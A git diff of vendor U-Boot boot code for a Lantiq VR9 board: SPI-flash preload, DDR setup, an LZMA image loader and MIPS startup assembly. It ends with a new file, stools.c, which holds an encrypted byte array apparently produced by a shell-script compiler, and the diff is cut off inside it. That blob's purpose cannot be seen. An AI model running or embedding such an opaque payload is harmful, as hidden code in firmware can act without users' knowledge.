+//  ulong dest_addr = BOOTSTRAP_CFG_MONITOR_BASE + gd->reloc_off;
+
+    mem_malloc_end = dest_addr;
+    mem_malloc_start = dest_addr - size;
+    mem_malloc_brk = mem_malloc_start;
+
+    memset ((void *) mem_malloc_start,
+        0,
+        mem_malloc_end - mem_malloc_start);
+}
+
+void *malloc(unsigned int size)
+{
+    if(size < (mem_malloc_end - mem_malloc_start))
+    {
+        mem_malloc_start += size;
+        return (void *)(mem_malloc_start - size);
+    }
+    return NULL;
+}
+
+void *realloc(void *src,unsigned int size)
+{
+    return NULL;
+}
+
+void free(void *src)
+{
+    return;
+}
+
+void * calloc(
+    size_t nelem,
+    size_t size)
+{
+   return;
+}
+
+void *sbrk (ptrdiff_t increment)
+{
+    ulong old = mem_malloc_brk;
+    ulong new = old + increment;
+
+    if ((new < mem_malloc_start) || (new > mem_malloc_end)) {
+        return (NULL);
+    }
+    mem_malloc_brk = new;
+    return ((void *) old);
+}
+
+
+static int init_baudrate (void)
+{
+
+	gd->baudrate = CONFIG_BAUDRATE;
+
+	return (0);
+}
+
+
+void uncompress_image(ulong image_addr)
+{
+	 
+   ulong   addr;
+   ulong   data, len, checksum;
+   ulong  *len_ptr;
+   unsigned int destLen;
+   image_header_t header;
+   image_header_t *hdr = &header;
+   int (*fn)();
+
+   mem_malloc_init(0x82000000, TOTAL_MALLOC_LEN);
+   addr = image_addr;
+   memmove (&header, (char *)addr, sizeof(image_header_t));
+
+     if (ntohl(hdr->ih_magic) != IH_MAGIC) {
+        return;
+    }
+
+   data = (ulong)&header;
+   len  = sizeof(image_header_t);
+
+   checksum = ntohl(hdr->ih_hcrc);
+   hdr->ih_hcrc = 0;
+   asm("sync");
+   if (crc32 (0, (char *)data, len) != checksum) {
+        return;
+    }
+
+   asm("sync");
+
+   data = addr + sizeof(image_header_t);
+
+   asm("sync");
+
+   len  = ntohl(hdr->ih_size);
+   asm("sync");
+
+   len_ptr = (ulong *)data;
+   asm("sync");
+
+   destLen = 0x0;
+
+   lzma_inflate ((unsigned char *)data, len, (unsigned char*)ntohl(hdr->ih_load), &destLen);
+
+   fn = ntohl(hdr->ih_load);
+
+   (*fn)();
+	
+}
+
+
+void board_init_f(ulong bootflag)
+{
+	gd_t gd_data, *id;
+	bd_t *bd;
+	ulong *s;
+	ulong lzmaImageaddr  = 0;
+        ulong  buffer[8];
+        ulong ddr_magic=0x88888888;
+	ulong erase_addr1=0, erase_addr2=0; 
+	ulong  ecc;
+	int i;
+        u8  cmd = CMD_MX25L_READ;
+        size_t  addr_len = 3;
+  
+	erase_addr1 = IFX_CFG_FLASH_DDR_CFG_START_ADDR; 
+	erase_addr2 = IFX_CFG_FLASH_DDR_CFG_START_ADDR + IFX_CFG_FLASH_DDR_CFG_SIZE;
+	
+         asm("sync");
+	 serial_init();
+	 asm("sync");
+	 
+	
+   
+         asm("sync");
+         mem_malloc_init (0xbe230000, 200);
+	 asm("sync");
+         sf_read(cmd,(ulong)IFX_CFG_FLASH_DDR_CFG_START_ADDR,addr_len,(u8*)&buffer,32);
+	 if(buffer[0]==ddr_magic)
+	   {
+		     ecc=buffer[1]^buffer[2]^buffer[3]^buffer[4]^buffer[5]^buffer[6];
+			   if(ecc!=buffer[7]){
+			   	  REG32(CONFIG_TUNING_STATUS)=0xff;			   	
+			   	}else{
+			   		REG32(CONFIG_TUNING_STATUS)=0;
+			   	}
+		 }
+	 else{
+ 	 	REG32(CONFIG_TUNING_STATUS)=0xff;
+	}	 
+
+   REG32(DDR_CCR07) = 0; /*put DDR controller inactive*/
+   asm("sync");
+	 if(REG32(CONFIG_TUNING_STATUS)==0xff){ 
+	      REG32(DDR_CCR39)= REG32(DDR_CCR39) & 0xffff00ff;
+	      REG32(DDR_CCR40)= REG32(DDR_CCR40) & 0xffff00ff;
+	      REG32(0xBF400430) = 0x04;
+	    }else{
+	      REG32(DDR_CCR39)= buffer[1];
+	      REG32(DDR_CCR40)= buffer[2];
+              REG32(DDR_CCR43)= buffer[3];
+	      REG32(DDR_CCR44)= buffer[4];
+              REG32(CSS_DDR_ECHO_DLL0)= buffer[5];
+              REG32(CSS_DDR_ECHO_DLL1)= buffer[6];
+      }
+   asm("sync");   
+   REG32(DDR_CCR07) = 0x1010100; /*put DDR controller active*/
+   while(!(REG32(DDR_CCR47) & 0x01));
+   while(!(REG32(DDR_CCR48) & 0x01)); 
+
+	 asm("sync");
+#ifdef CONFIG_TUNE_DDR
+	 tune_ddr();
+#endif
+
+   sf_read(cmd,(ulong)0x5000,addr_len,(u8*)0xa0100000,0x10000);  /*copy u-boot image*/
+   sf_read(cmd,(ulong)0x10000,addr_len,(u8*)0xa0110000,0x20000);  /*copy gphy firmware*/
+
+   uncompress_image(0xa0100000);
+ 
+ 
+   
+	/* NOTREACHED - relocate_code() does not return */
+}
diff --git a/board/vr9/sfpreload.c b/board/vr9/sfpreload.c
new file mode 100644
--- /dev/null
+++ b/board/vr9/sfpreload.c
@@ -0,0 +1,89 @@
+#include <common.h>
+#include <spi.h>
+#include <asm/ifx_ssc.h>
+
+#ifndef CONFIG_ENV_SPI_BUS
+# define CONFIG_ENV_SPI_BUS 0
+#endif
+#ifndef CONFIG_ENV_SPI_CS
+# define CONFIG_ENV_SPI_CS      0
+#endif
+#ifndef CONFIG_ENV_SPI_MAX_HZ
+# define CONFIG_ENV_SPI_MAX_HZ  1000000
+#endif
+#ifndef CONFIG_ENV_SPI_MODE
+# define CONFIG_ENV_SPI_MODE    SPI_MODE_3
+#endif
+
+#define CMD_MX25L_READ     0x03
+
+#define SRC_OFFSET  0x00000500
+#define DST_ADDRESS 0xbe220500
+#define DATA_SIZE   0x5000
+
+
+												
+static void
+SPI_ON(unsigned int cs)
+{
+    ssc_cs_clr(cs);
+}
+
+static void	SPI_OFF(unsigned int cs)
+{
+    ssc_cs_set(cs);
+}
+
+void spi_write_byte(uint8_t transmit)
+{
+    asm("sync");
+    ssc_tx_only();
+    ssc_write(transmit);
+    asm("sync");
+    return;
+}
+
+static uint8_t	spi_read_byte(void)
+{
+    ssc_rx_only();
+    return ssc_read();
+}
+
+
+void sf_read(const u8 cmd, u8 *offset, 
+		size_t addr_len, u8 *data, size_t data_len)
+{
+	  int i;
+	  SPI_ON(CONFIG_ENV_SPI_CS);
+	  spi_write_byte(cmd);
+	  for(i=0;i<addr_len;i++){
+	  	spi_write_byte(*(offset+i));
+	  }
+	  for(i=0;i<data_len;i++){
+	  	*(data+i)=spi_read_byte();
+	  }
+	  SPI_OFF(CONFIG_ENV_SPI_CS);
+}		
+
+void sf_init(void)
+{
+	  u8 cmd=0;
+	  u8 offset[5]={0};
+	  size_t addr_len=0;
+	  int i;
+	  int (*fn)();
+#ifdef CONFIG_SPI_FLASH_MXIC
+    cmd = CMD_MX25L_READ;
+    addr_len = 3;
+#endif	
+    for(i=0;i<addr_len;i++){
+      offset[i]= (u8)((SRC_OFFSET >>((addr_len-i-1)*8)) & 0xff);
+    }
+    asm("sync");
+	  sf_read(cmd,(u8*)&offset,addr_len,(u8*)(DST_ADDRESS),DATA_SIZE);
+	  fn=DST_ADDRESS;
+	  (*fn)();
+}
+
+
+
diff --git a/board/vr9/sfpreload.lds b/board/vr9/sfpreload.lds
new file mode 100644
--- /dev/null
+++ b/board/vr9/sfpreload.lds
@@ -0,0 +1,47 @@
+/*
+ * (C) Copyright 2003
+ * Wolfgang Denk Engineering, <wd@denx.de>
+ *
+ * See file CREDITS for list of people who contributed to this
+ * project.
+ *
+ * This program is free software; you can redistribute it and/or
+ * modify it under the terms of the GNU General Public License as
+ * published by the Free Software Foundation; either version 2 of
+ * the License, or (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+ * MA 02111-1307 USA
+ */
+
+OUTPUT_FORMAT("elf32-tradbigmips", "elf32-tradbigmips", "elf32-tradbigmips")
+OUTPUT_ARCH(mips)
+ENTRY(_start)
+SECTIONS
+{
+  . = 0x00000000;
+  . = ALIGN(4);
+	.text       :
+	{
+	  *(.text)
+	}
+  . = ALIGN(4);
+  .rodata  : { *(.rodata) }
+  . = ALIGN(4);
+  .data  : { *(.data) }
+	. = ALIGN(4);
+	.sdata  : { *(.sdata) }
+  _gp = ABSOLUTE(.);
+  _etext = ABSOLUTE(.);
+  .got  : { *(.got) }
+  .sbss  : { *(.sbss) }
+  .bss  : { *(.bss) }
+	
+}
diff --git a/board/vr9/start_sfddr.S b/board/vr9/start_sfddr.S
new file mode 100644
--- /dev/null
+++ b/board/vr9/start_sfddr.S
@@ -0,0 +1,529 @@
+/*
+ *  Startup Code for MIPS32 CPU-core
+ *
+ *  Copyright (c) 2003	Wolfgang Denk <wd@denx.de>
+ *
+ * See file CREDITS for list of people who contributed to this
+ * project.
+ *
+ * This program is free software; you can redistribute it and/or
+ * modify it under the terms of the GNU General Public License as
+ * published by the Free Software Foundation; either version 2 of
+ * the License, or (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+ * MA 02111-1307 USA
+ */
+
+
+#include <config.h>
+#include <version.h>
+#include <asm/regdef.h>
+#include <asm/mipsregs.h>
+#include <asm/cacheops.h>
+#include <asm/addrspace.h>
+#include <asm/yamon.h>
+
+/*****************************************************************************
+ * Local assembler register definitions
+ *****************************************************************************/
+#define C0_EBASe     $15,1
+
+#define CFG_BOOTSTRAP_CODE
+
+#define S_EBASeExpBase     12       /* Exception Base */
+#define M_EBASeExpBase     (0x3ffff << S_EBASeExpBase)
+#define S_EBASeCPUNum      0        /* CPU Number */
+#define M_EBASeCPUNum      (0x1ff << S_EBASeCPUNum)
+
+/*
+ * Values in the CPU Number field
+ */
+#define K_EBASeCPUNum_Host 0
+#define K_EBASeCPUNum_Voice 1
+
+/* C0_EBASE register encoding */
+#define CO_EBASE_EXPBASE_SHF     S_EBASeExpBase
+#define CO_EBASE_EXPBASE_MSK     M_EBASeExpBase
+
+#define CO_EBASE_CPUNUM_SHF      S_EBASeCPUNum
+#define CO_EBASE_CPUNUM_MSK      M_EBASeCPUNum
+
+#define CO_EBASE_CPU_HOST     K_EBASeCPUNum_Host
+#define CO_EBASE_CPU_VOICE    K_EBASeCPUNum_Voice
+
+#define CFG_EBU_BOOTWORD              0x688c688c
+
+
+/* FixMe: Adresses not defined... */
+#define RST_STAT   0xbf203014
+/* POR,SRST, WDT0, WDT1,HRST*/
+#define HARD_RST 0xE8000001
+    .set noreorder
+	.globl _start
+   	.globl __exception_vector_tlb_refill
+   	.globl __exception_vector_xtlb_refill
+   	.globl __exception_vector_general
+   	.globl __exception_vector_int
+   	.text
+
+_start:
+	/* RESET entry */
+   	b     reset
+   	nop
+   	nop
+   	nop
+   .org 0x10
+   .word CFG_EBU_BOOTWORD     /* EBU init code, fetched during booting */
+   .word 0x00000000           /* phase of the flash                    */
+
+   .org 0x18
+   .string "1.1.0"            /* version 1.1.0                         */
+   .word 0x00000000
+   .align 4
+
+reset:
+    mtc0    zero, CP0_WATCHLO
+	mtc0    zero, CP0_WATCHHI
+	mtc0    zero, CP0_CAUSE
+				
+       /* Determine processor */
+	mfc0    k1, C0_PRId
+	li	t0, M_PRIdImp | M_PRIdCoID
+	and     k1, t0
+
+/* Check if it is a MIPS 34K processor */
+	li	t0, MIPS_34K
+	bne	k1, t0, 2f
+	nop
+
+	/* Setup MIPS34K specifics (implementation dependent fields) */
+	MFC0(   t0, C0_Config )
+	li	t1, CONFIG0_MIPS32_64_MSK
+	and	t0, t1
+	li	t1, CONFIG0_MIPS34K
+	or	t0, t1
+	MTC0(	t0, C0_Config )
+
+	MFC0(   t0, C0_Status )
+	li	t1, STATUS_MIPS32_64_MSK
+	and	t0, t1
+	li	t1, STATUS_MIPS34K
+	or	t0, t1
+	MTC0(	t0, C0_Status )
+
+2:
+	/* Check if it is a MIPS 4K/5K family processor */
+	li	t0, MIPS_4Kc
+	beq	k1, t0, 1f
+	nop
+	li	t0, MIPS_4KEc
+	beq	k1, t0, 1f
+	nop
+
+	b	mips32_64
+	nop
+
+1:
+	/* Setup MIPS 4K/5K specifics (implementation dependent fields) */
+	MFC0(   t0, C0_Config )
+	li	t1, CONFIG0_MIPS32_64_MSK
+	and	t0, t1
+	li	t1, CONFIG0_MIPS4K5K
+	or	t0, t1
+	MTC0(	t0, C0_Config )
+
+	MFC0(   t0, C0_Status )
+	li	t1, STATUS_MIPS32_64_MSK
+	and	t0, t1
+	li	t1, STATUS_MIPS4K5K
+	or	t0, t1
+	MTC0(	t0, C0_Status )
+
+/************************************************************************
+ *  MIPS32/MIPS64 specific cpu initialisation
+ ************************************************************************/
+mips32_64:
+
+	/* Setup generic MIPS32/MIPS64 fields of STATUS register */
+	MFC0(   t0, C0_Status )
+	li	t1, ~STATUS_MIPS32_64_MSK
+	and	t0, t1
+	li	t1, STATUS_MIPS32_64
+	or	t0, t1
+	MTC0(	t0, C0_Status )
+
+	/* Setup generic MIPS32 fields of CONFIG0 register */
+	MFC0(   t0, C0_Config )
+	li	t1, ~CONFIG0_MIPS32_64_MSK
+	and	t0, t1
+	li	t1, CONFIG0_MIPS32_64
+	or	t0, t1
+	MTC0(	t0, C0_Config )
+
+
+	/* Initialize GOT pointer.
+	*/
+	bal     1f
+	nop
+	.word   _GLOBAL_OFFSET_TABLE_
+1:
+	move    gp, ra
+	lw      t1, 0(ra)
+	move	gp, t1
+       
+    
+   	/* Initialize any external memory.
+	 */
+	la      t9, lowlevel_init
+	jalr    t9
+	nop
+lowlevel_init_done:
+
+sys_init_cache:
+
+#define RA                      t4
+#define icache_size             t3
+#define icache_linesize         t2
+#define dcache_size             t1
+#define dcache_linesize         t0
+        move    RA, ra
+        move    a0, k1
+        bal     sys_determine_icache_linesize_flash
+        nop
+	move    icache_linesize, v0 /*icache_linesize=0x20 for amazon_s*/
+
+        bal     sys_determine_icache_lines_flash /*icache lines=0x400 for amazon_s*/
+        nop
+        multu   icache_linesize, v0
+        mflo    icache_size /*icache_size=0x8000 for amazon_s*/
+
+        bal             sys_determine_dcache_linesize_flash
+        nop
+        move    dcache_linesize, v0 /*dcache_linesize=0x20 for amazon_s*/
+
+        bal         sys_determine_dcache_lines_flash /*dcache lines=0x200 for amazon_s*/
+        nop
+        multu   dcache_linesize, v0
+        mflo    dcache_size  /*dcache_size=0x4000 for amazon_s*/
+
+        /* Initialise instruction cache */
+        move    a0, icache_size
+        move    a1, icache_linesize
+        bal             sys_init_icache
+        nop
+
+        /* Initialise data cache */
+        move    a0, dcache_size
+        move    a1, dcache_linesize
+        bal         sys_init_dcache
+        move    a2, k1
+#if 1
+change_got_table: 
+        bal     1f
+	      nop
+        .word   got_size
+1:
+        move    t1, ra
+	      lw      t1, 0(t1)
+	      
+        move    t0, gp
+        add     t1, t0, t1
+        addi    t0, 8 /*skip first 2 entries*/
+2:    
+        lw      t2, 0(t0)
+        subu    t2, 0x20000000
+        sw      t2, 0(t0)
+        bne     t0, t1, 2b  
+        addi    t0, t0, 4        
+
+      	subu    gp, 0x20000000
+#endif	 
+	    li	t0, 0x9E22FF00 
+	    la	sp, 0(t0)
+	    la	t9, board_init_f
+	    j	t9
+	    nop
+
+
+	/* Exception handlers.
+	 */
+romReserved:
+	b romReserved
+
+romExcHandle:
+	b romExcHandle
+
+
+
+
+/* icache init */
+
+sys_init_icache:
+	li	 a3, MIPS_34K
+	beq	 a3, a2, 2f
+	nop
+
+1:
+	/* 20Kc/25Kf : Clear ITagLo/ITagHi */
+	/* Note: Use the default case because ITagLo==TagLo and ITagHI=TagHi */
+
+	/* default: Clear TagLo/TagHi */
+	MTC0( zero, C0_TagLo )
+	MTC0( zero, C0_TagHi )
+	b	0f
+	 nop
+
+2:
+	/* 24K/24KE/34K : Clear ITagLo */
+	MTC0_SEL_OPCODE( R_zero, R_C0_ITagLo, R_C0_SelITagLo )
+
+0:
+	/* Calc an address that will correspond to the first cache line */
+	// li	a2, KSEG0BASE
+	li 		a2, 0x9fc00000
+
+	/* Calc an address that will correspond to the last cache line  */
+	addu	a3, a2, a0
+	subu    a3, a1
+
+	/* Loop through all lines, invalidating each of them */
+1:
+	cache	ICACHE_INDEX_STORE_TAG, 0(a2)	/* clear tag */
+	bne	a2, a3, 1b
+	addu	a2, a1
+
+9:
+	jr	ra
+	nop
+
+
+/* dcache init */
+
+sys_init_dcache:
+	li	 a3, MIPS_34K
+	beq	 a3, a2, 2f
+	nop
+
+	/* default: Clear TagLo/TagHi */
+	MTC0( zero, C0_TagLo )
+	MTC0( zero, C0_TagHi )
+	b	0f
+	 nop
+
+1:
+	/* 20Kc/25Kf : Clear DTagLo and DTagHi */
+	MTC0_SEL_OPCODE( R_zero, R_C0_DTagLo, R_C0_SelDTagLo )
+	MTC0_SEL_OPCODE( R_zero, R_C0_DTagHi, R_C0_SelDTagHi )
+	b	0f
+	 nop
+2:
+	/* 24K/24KE/34K : Clear DTagLo */
+	MTC0_SEL_OPCODE( R_zero, R_C0_DTagLo, R_C0_SelDTagLo )
+
+
+/************************************************************************
+ *  invalidating all dcache lines
+ ************************************************************************/
+0:
+	/* Calc an address that will correspond to the first cache line */
+//	li	a2, KSEG0BASE
+	li	a2, 0x9fc00000
+
+	/* Calc an address that will correspond to the last cache line  */
+	addu	a3, a2, a0
+	subu    a3, a1
+
+	/* Loop through all lines, invalidating each of them */
+1:
+	cache	DCACHE_INDEX_STORE_TAG, 0(a2)	/* clear tag */
+	bne		a2, a3, 1b
+	addu	a2, a1
+#if 0
+/************************************************************************
+ *  fetch and lock all dcache lines
+ ************************************************************************/
+	/* Calc an address that will correspond to the first cache line */
+//	li	a2, KSEG0BASE
+	li	a2, 0x9fc00000
+
+	/* Calc an address that will correspond to the last cache line  */
+	addu	a3, a2, a0
+	subu    a3, a1
+
+	/* Loop through all lines, invalidating each of them */
+1:
+	cache	DCACHE_ADDR_FETCH_LOCK, 0(a2)	/* clear tag */
+        //cache   DCACHE_ADDR_HIT_WRITEBACK_INVALIDATE, 0(a2)  /* invalidate */
+	bne		a2, a3, 1b
+	addu	a2, a1
+
+9:
+
+#endif
+	jr	ra
+	 nop
+
+
+
+
+
+/* Subroutine : Determine icache line size */
+
+sys_determine_icache_linesize_flash:
+icache_linesize_mips32:
+
+	/* Read CONFIG1 register, which holds implementation data */
+	MFC0_SEL_OPCODE( R_t9, R_C0_Config1, R_C0_SelConfig1 )
+
+#define config1	t9
+
+	/* I-cache line size */
+	li	t8, M_Config1IL
+	and	t8, config1
+	//beq	t8, zero, icache_linesize_zero
+	li	t7, S_Config1IL
+	srl	t8, t7
+	li	t7, 0x2
+	sll	v0, t7, t8
+
+	jr	ra
+	nop
+
+/* Subroutine : Determine icache line */
+
+sys_determine_icache_lines_flash:
+icache_lines_mips32:
+
+	/* Read CONFIG1 register, which holds implementation data */
+	MFC0_SEL_OPCODE( R_t9, R_C0_Config1, R_C0_SelConfig1 )
+
+#define config1	t9
+
+	/* I-cache lines
+	 * Calculated as associativity * sets per way
+	 */
+	li	t8, M_Config1IA
+	and	t8, config1
+	li	t7, S_Config1IA
+	srl	t8, t7
+	addiu	t8,1				/* t8 = associativity	*/
+
+	li	t7, M_Config1IS
+	and	t7, config1
+	li	t9, S_Config1IS
+	srl	t7, t9
+	li	t9, 0x40
+	sll	t7, t9, t7			/* t7 = sets per way	*/
+
+	multu	t8, t7
+	mflo    v0
+
+	jr	ra
+	nop
+
+
+/* Subroutine : Determine dcache line size */
+
+sys_determine_dcache_linesize_flash:
+dcache_linesize_mips32:
+.globl   dcache_linesize_mips32
+.ent     dcache_linesize_mips32
+	/* Read CONFIG1 register, which holds implementation data */
+	MFC0_SEL_OPCODE( R_t9, R_C0_Config1, R_C0_SelConfig1 )
+
+#define config1	t9
+
+	/* D-cache line size */
+	li	t8, M_Config1DL
+	and	t8, config1
+	//beq	t8, zero, dcache_linesize_zero
+	li	t7, S_Config1DL
+	srl	t8, t7
+	li	t7, 0x2
+	sll	v0, t7, t8
+
+	jr	ra
+	nop
+.end    dcache_linesize_mips32
+/* Subroutine : Determine dcache line */
+
+sys_determine_dcache_lines_flash:
+dcache_lines_mips32:
+
+	/* Read CONFIG1 register, which holds implementation data */
+	MFC0_SEL_OPCODE( R_t9, R_C0_Config1, R_C0_SelConfig1 )
+
+#define config1	t9
+
+	/* D-cache lines
+	 * Calculated as associativity * sets per way
+	 */
+	li	t8, M_Config1DA
+	and	t8, config1
+	li	t7, S_Config1DA
+	srl	t8, t7
+	addiu	t8,1				/* t8 = associativity	*/
+
+	li	t7, M_Config1DS
+	and	t7, config1
+	li	t9, S_Config1DS
+	srl	t7, t9
+	li	t9, 0x40
+	sll	t7, t9, t7			/* t7 = sets per way	*/
+
+	multu	t8, t7
+	mflo    v0
+
+	jr	ra
+	nop
+
+dcache_writeback_invalidate:
+//    a0 : size
+//    a1 : dcache_line_size
+//    a2 : start addr
+.globl   dcache_writeback_invalidate
+.ent     dcache_writeback_invalidate
+
+	addu	t8, a2, a0
+	subu  t8, a1
+	/* Loop through all address */
+1:
+	cache	DCACHE_ADDR_HIT_WRITEBACK_INVALIDATE, 0(a2)	/* clear tag */
+//	bne		a2, t8, 1b
+	sub	t9, a2, t8
+	blez	t9, 1b
+	addu	a2, a1
+
+9:
+	jr	ra
+	nop
+        .end    dcache_writeback_invalidate
+
+dcache_hit_invalidate:
+//    a0 : size
+//    a1 : dcache_line_size
+//    a2 : start addr
+.globl   dcache_hit_invalidate
+.ent     dcache_hit_invalidate
+
+	addu	t8, a2, a0
+	subu  t8, a1
+	/* Loop through all address */
+1:
+	cache	DCACHE_ADDR_HIT_INVALIDATE, 0(a2)	/* clear tag */
+	bne		a2, t8, 1b
+	addu	a2, a1
+
+9:
+	jr	ra
+	nop
+        .end dcache_hit_invalidate
+
diff --git a/board/vr9/start_sfpreload.S b/board/vr9/start_sfpreload.S
new file mode 100644
--- /dev/null
+++ b/board/vr9/start_sfpreload.S
@@ -0,0 +1,46 @@
+/*
+ *  Startup Code for MIPS32 CPU-core
+ *
+ *  Copyright (c) 2003	Wolfgang Denk <wd@denx.de>
+ *
+ * See file CREDITS for list of people who contributed to this
+ * project.
+ *
+ * This program is free software; you can redistribute it and/or
+ * modify it under the terms of the GNU General Public License as
+ * published by the Free Software Foundation; either version 2 of
+ * the License, or (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+ * MA 02111-1307 USA
+ */
+
+
+#include <config.h>
+#include <version.h>
+#include <asm/regdef.h>
+#include <asm/mipsregs.h>
+#include <asm/cacheops.h>
+#include <asm/addrspace.h>
+#include <asm/yamon.h>
+
+    .set noreorder
+	  .option pic0
+
+   	.globl _start
+   	.text
+_start:
+    li   t0, 0xBE22FF00
+    la      sp, 0(t0)
+    
+    la   t9, sf_init
+    j    t9
+    nop
+    
diff --git a/board/vr9/stools.c b/board/vr9/stools.c
new file mode 100644
--- /dev/null
+++ b/board/vr9/stools.c
@@ -0,0 +1,728 @@
+static  char data [] = 
+#define      date_z	1
+#define      date	((&data[0]))
+	"\044"
+#define      msg2_z	19
+#define      msg2	((&data[3]))
+	"\227\353\003\134\370\111\346\106\362\366\262\046\205\227\024\134"
+	"\101\341\113\012\363\000\045\057"
+#define      pswd_z	256
+#define      pswd	((&data[43]))
+	"\347\365\273\071\270\226\243\152\234\121\357\251\271\056\006\135"
+	"\035\056\321\056\377\236\024\017\305\032\055\171\060\341\166\172"
+	"\217\361\113\057\261\170\363\202\343\240\176\213\135\103\363\047"
+	"\217\304\126\216\143\152\235\050\205\313\241\266\255\030\060\074"
+	"\011\173\154\272\364\140\074\327\000\273\143\135\376\126\205\215"
+	"\033\333\034\176\106\272\247\313\205\111\202\063\141\263\160\152"
+	"\056\334\045\043\075\142\373\075\035\136\233\034\265\040\251\320"
+	"\373\306\117\102\200\367\016\006\100\220\071\241\103\252\014\162"
+	"\206\062\226\303\224\221\001\262\360\234\316\246\275\170\167\270"
+	"\076\306\373\277\276\011\305\376\231\377\240\334\252\254\117\060"
+	"\337\345\364\163\167\366\046\150\222\364\016\120\155\205\011\254"
+	"\114\004\153\012\015\061\010\246\061\251\203\333\125\322\014\064"
+	"\270\001\250\057\367\316\227\212\303\245\332\060\053\343\334\167"
+	"\347\110\201\364\171\212\233\253\063\037\206\211\362\222\276\252"
+	"\223\147\332\213\066\161\025\371\027\357\052\103\322\007\272\272"
+	"\117\074\257\311\307\112\164\373\152\373\204\134\216\103\006\042"
+	"\252\340\255\341\122\302\333\152\262\005\255\205\015\150\077\135"
+	"\244\356\312\127\312\061\373\141\035\373\207\114\002\317\046\351"
+	"\305\341\043\175\167\307\347\024\030\326\275\321\005\304\057\043"
+	"\362\371\173\274\052\166\036\107\162\245\224\164\165\272\135\072"
+	"\234\200\267\024\107\237\050\140\165"
+#define      tst2_z	19
+#define      tst2	((&data[354]))
+	"\061\325\245\124\042\176\107\333\372\154\111\203\017\025\200\022"
+	"\231\317\247\252\141"
+#define      rlax_z	1
+#define      rlax	((&data[375]))
+	"\213"
+#define      msg1_z	42
+#define      msg1	((&data[379]))
+	"\221\170\315\355\274\361\052\171\361\120\033\243\322\102\146\107"
+	"\140\135\264\257\364\151\305\130\262\347\041\265\270\127\204\002"
+	"\324\326\312\304\267\075\150\241\035\232\160\300\304\003\035\142"
+	"\167\222"
+#define      shll_z	8
+#define      shll	((&data[428]))
+	"\271\125\146\153\071\175\306\202\140\104\204\315"
+#define      opts_z	1
+#define      opts	((&data[438]))
+	"\045"
+#define      chk2_z	19
+#define      chk2	((&data[442]))
+	"\057\025\207\134\224\361\175\062\370\153\301\270\221\007\216\345"
+	"\104\330\006\211\267\044\221\264\044\354"
+#define      text_z	4668
+#define      text	((&data[1041]))
+	"\140\366\100\144\024\242\333\247\277\260\164\171\006\371\107\243"
+	"\034\075\241\266\032\321\313\241\142\200\305\117\120\104\302\261"
+	"\072\002\025\116\245\361\365\145\242\152\336\250\143\046\114\200"
+	"\143\356\066\175\277\002\037\042\203\345\161\323\051\063\205\143"
+	"\066\233\262\334\214\250\102\056\022\041\327\166\107\044\366\252"
+	"\022\054\050\321\057\107\364\262\054\145\206\126\231\013\272\320"
+	"\246\154\254\063\025\356\142\050\017\071\236\127\135\225\001\157"
+	"\301\052\101\360\162\065\243\237\233\052\365\065\065\257\005\334"
+	"\034\262\017\062\241\162\132\261\253\371\010\011\216\012\171\120"
+	"\064\273\101\246\361\344\106\215\016\073\302\104\352\310\041\007"
+	"\173\061\071\034\243\223\315\117\215\326\131\033\340\322\154\025"
+	"\216\255\274\177\222\002\014\241\075\317\345\050\227\007\057\022"
+	"\070\150\057\334\374\375\053\212\323\204\245\264\127\022\311\345"
+	"\277\205\144\121\207\161\362\305\100\330\355\330\337\035\352\030"
+	"\205\032\364\202\030\040\014\353\244\262\240\374\304\151\341\204"
+	"\356\106\325\166\267\310\073\367\241\051\317\201\106\272\231\314"
+	"\325\216\117\355\256\133\331\123\016\171\117\323\342\061\127\321"
+	"\167\054\107\057\365\203\046\226\254\366\027\363\261\260\300\206"
+	"\077\017\164\355\153\115\101\171\306\221\114\251\302\243\172\072"
+	"\320\302\151\305\105\220\133\362\206\163\345\070\044\246\276\143"
+	"\265\062\121\040\200\222\232\106\043\346\357\346\212\151\040\133"
+	"\054\212\040\161\032\174\144\240\357\112\330\024\360\227\167\245"
+	"\312\310\306\112\133\140\220\176\107\200\145\322\352\206\055\026"
+	"\020\115\207\052\312\353\313\272\066\244\316\046\073\105\313\005"
+	"\016\222\120\151\362\341\350\072\141\115\014\113\324\071\141\344"
+	"\207\351\016\121\325\332\013\013\176\332\061\272\037\375\300\055"
+	"\217\020\227\202\361\177\274\122\315\311\236\241\002\000\205\211"
+	"\351\224\333\277\157\347\312\355\301\374\247\341\372\147\017\212"
+	"\170\246\014\151\045\311\274\362\222\132\224\225\133\031\037\105"
+	"\256\372\004\035\342\317\013\243\313\262\204\306\032\223\120\222"
+	"\072\134\374\137\046\271\122\271\024\346\116\157\000\155\264\257"
+	"\150\270\314\112\210\327\356\123\212\162\032\245\006\152\070\101"
+	"\307\064\240\355\355\363\246\001\332\365\161\333\142\045\212\313"
+	"\336\127\025\146\057\003\272\271\166\324\136\175\076\226\276\005"
+	"\313\137\363\271\123\232\273\056\217\054\011\361\122\223\275\060"
+	"\352\322\226\031\326\121\323\115\045\062\312\144\311\211\152\225"
+	"\262\126\135\215\242\132\363\173\150\260\117\201\010\174\243\102"
+	"\016\000\174\065\227\137\130\050\063\142\130\273\206\032\045\145"
+	"\162\267\123\073\356\350\117\255\153\320\244\056\331\140\217\320"
+	"\253\116\134\044\124\272\127\275\064\261\300\051\320\165\025\030"
+	"\126\133\320\063\237\345\073\315\150\313\150\070\212\004\230\332"
+	"\334\344\075\315\331\047\124\256\006\240\352\236\362\304\065\114"
+	"\035\276\031\032\051\236\165\245\112\320\340\011\005\354\210\240"
